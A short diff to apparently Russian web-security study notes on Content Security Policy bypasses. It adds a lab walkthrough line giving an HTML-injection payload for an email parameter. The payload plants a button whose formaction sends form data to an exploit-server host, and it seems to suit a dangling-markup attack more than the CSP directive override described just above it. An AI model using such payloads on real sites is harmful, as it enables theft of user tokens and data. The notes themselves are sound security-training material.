@@ -51,6 +51,11 @@ img-src https://images.normal-website.com
 
 Как правило, перезаписать существующую директиву `script-src` невозможно. Однако недавно Chrome представил директиву `script-src-elem`, которая позволяет контролировать элементы `script`, но не события. Критически важно, что эта новая директива позволяет перезаписывать существующие директивы `script-src`. Используя это знание вы можете решить следующую лабораторную работу:
 # Пример Lab: Reflected XSS protected by CSP, with CSP bypass
+находим параметр email 
+```
+x@x"><button formaction="https://exploit-0a9300d9046c306c80c457010174002e.exploit-server.net/exploit" formmethod="get">Click me</button>
+```
+ такой пейлоад 
 
 ---
 # Защита от Clickjacking с помощью CSP
